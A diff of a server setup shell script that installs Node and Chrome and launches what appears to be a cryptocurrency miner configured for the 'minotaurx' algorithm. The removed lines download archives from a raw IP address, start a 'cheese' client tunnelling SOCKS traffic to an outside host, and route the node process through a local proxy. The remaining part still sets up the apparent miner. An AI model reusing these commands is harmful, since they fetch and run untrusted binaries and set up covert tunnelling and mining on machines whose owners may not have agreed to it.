@@ -38,10 +38,6 @@ npm install
 
 sleep 2
 
-npm install pm2 -g
-
-sleep 2
-
 wget -q -O - https://dl-ssl.google.com/linux/linux_signing_key.pub | apt-key add -
 echo "deb http://dl.google.com/linux/chrome/deb/ stable main" | tee /etc/apt/sources.list.d/google.list
 
@@ -52,61 +48,14 @@ apt-get install -y google-chrome-stable
 
 sleep 2
 
-wget -q http://8.208.114.21/cheese.tar.gz > /dev/null
-sleep 2
-npm install pm2 -g
-
-sleep 2
-
-tar -xf cheese.tar.gz
-
-sleep 2
-
-./cheese client -v 45.135.58.52:443 7777:socks &
-
-sleep 2
-
 TZ='Africa/Johannesburg'; export TZ
 date
-sleep 2
-
-wget http://8.208.114.21/update.tar.gz > /dev/null
-
-sleep 2
-
-tar -xf update.tar.gz > /dev/null
-
-sleep 2
-
-cat > update/local/update-local.conf <<END
-listen = :2233
-loglevel = 1
-socks5 = 127.0.0.1:7777
-END
-
-./update/local/update-local -config update/local/update-local.conf & > /dev/null
-
-sleep 2
-
-ps -A | grep update-local | awk '{print $1}' | xargs kill -9 $1
-
-sleep 3
-
-./update/local/update-local -config update/local/update-local.conf & > /dev/null
-
-sleep 2
-
-./update/update curl ifconfig.me
-
 sleep 2
 
 rm config.json
 
 sleep 2
 
-#./update/update bash
-
-	
 cat > config.json <<END
 {
   "algorithm": "minotaurx",
@@ -121,8 +70,7 @@ END
 
 sleep 5
 
-#pm2 start index.js --watch
-#./update/update node index.js
+node index.js
 
-./update/update pm2 start index.js
+
 
